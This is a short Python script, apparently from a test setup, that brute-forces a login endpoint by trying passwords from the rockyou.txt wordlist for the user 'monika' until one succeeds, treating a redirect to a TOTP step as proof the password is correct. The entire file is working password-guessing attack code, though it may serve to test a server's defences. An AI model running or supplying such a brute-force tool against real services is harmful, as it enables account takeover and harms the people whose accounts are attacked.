import os
from .client import login
from .init_server_data import init_server_data


def start_test(username, max_tries):
    # Get the directory where this script is located
    script_dir = os.path.dirname(os.path.abspath(__file__))
    rockyou_file_path = os.path.join(script_dir, 'rockyou.txt')
    
    attempt_count = 0
    
    # Read rockyou.txt line by line
    with open(rockyou_file_path, 'r', encoding='utf-8', errors='ignore') as f:
        for line in f:
            password = line.strip()
            
            # Skip empty lines
            if not password:
                continue
            
            attempt_count += 1
            
            # Check if we've reached the maximum number of tries
            if attempt_count > max_tries:
                print(f"\n✗ Maximum number of tries ({max_tries}) reached")
                return None
            
            # Try to login with this password
            response, status_code, redirect_url = login(username, password)
            
            # Check if login was successful
            # Status 200 = success (no TOTP), Status 302 = redirect to TOTP (password correct)
            if status_code == 200:
                print(f"Password found after {attempt_count} attempts!")
                print(f"Password: {password}")
                return password
            elif status_code == 302:
                print(f"Password found after {attempt_count} attempts!")
                print(f"Password: {password}")
                print(f"Note: User has TOTP enabled (redirected to: {redirect_url})")
                return password
            
            # Print progress every 1000 attempts
            if attempt_count % 1000 == 0:
                print(f"Attempted {attempt_count}/{max_tries} passwords... (current: {password[:20]}...)")
            
    print(f"Password not found after {attempt_count} attempts")
    return None

if __name__ == '__main__':
    start_test("monika", 10000)